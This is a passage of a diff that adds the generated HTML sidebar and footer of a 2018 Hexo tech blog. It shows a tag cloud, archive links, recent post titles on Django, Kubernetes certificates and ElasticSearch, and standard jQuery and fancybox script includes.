href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/whatweb/" style="font-size: 10px;">whatweb</a> <a href="/tags/x-pack/" style="font-size: 10px;">x-pack</a> <a href="/tags/余弦相似性/" style="font-size: 10px;">余弦相似性</a> <a href="/tags/区块链/" style="font-size: 10px;">区块链</a> <a href="/tags/区块链安全/" style="font-size: 10px;">区块链安全</a> <a href="/tags/协程/" style="font-size: 10px;">协程</a> <a href="/tags/技术研究/" style="font-size: 12px;">技术研究</a> <a href="/tags/未授权访问漏洞/" style="font-size: 10px;">未授权访问漏洞</a> <a href="/tags/漏洞扫描器/" style="font-size: 10px;">漏洞扫描器</a> <a href="/tags/爬虫技术/" style="font-size: 12px;">爬虫技术</a> <a href="/tags/生活杂谈/" style="font-size: 10px;">生活杂谈</a> <a href="/tags/编程之道/" style="font-size: 20px;">编程之道</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/09/28/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/28/记Django开发中的一些常用代码段/">记Django开发中的一些常用代码段</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/生成k8s证书的三种方式/">生成k8s证书的三种方式</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/19/23种非常有用的ElasticSearch查询例子/">23种非常有用的ElasticSearch查询例子</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/19/ElasticSearch-索引查询使用指南/">ElasticSearch 索引查询使用指南</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 chucz<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
